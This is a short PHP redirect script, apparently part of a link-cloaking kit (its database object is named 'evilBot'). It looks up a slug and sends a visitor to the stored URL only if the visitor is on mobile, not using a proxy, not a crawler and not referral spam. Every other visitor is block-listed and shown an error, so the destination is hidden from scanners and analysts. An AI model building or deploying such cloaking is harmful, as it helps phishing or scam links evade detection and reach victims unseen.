<?php

require_once 'autoload.php';

if (isset($_GET['slug'])) {
    if ($_SERVER['HTTP_HOST'] == $config['maindomain']) {
        $EB->selferror();
    } else {
        $EB->CheckBlockList();
        $find = $evilBot->search('slug', $_GET['slug'])->fetch();
        if (empty($find[0]['url'])) {
            $EB->addToBlockList();
            $EB->selferror();
        } else {
            if ($MD->isMobile() || $MD->isTablet()) {
                if (!proxycheck_function($EB->get_client_ip())) {
                    if (!$CD->isCrawler()) {
                        if (!$RS->isReferralSpam()) {
                            $update = [
                                'click' => $find[0]['click'] + 1
                            ];
                            $evilBot->where('slug', '=', $_GET['slug'])->update($update);
                            $EB->VisPass($find[0]['url']);
                        } else {
                            $EB->addToBlockList();
                            $EB->selferror();
                        }
                    } else {
                        $EB->addToBlockList();
                        $EB->selferror();
                    }
                } else {
                    $EB->addToBlockList();
                    $EB->selferror();
                }
            } else {
                $EB->addToBlockList();
                $EB->selferror();
            }
            exit;
        }
        exit;
    }
}
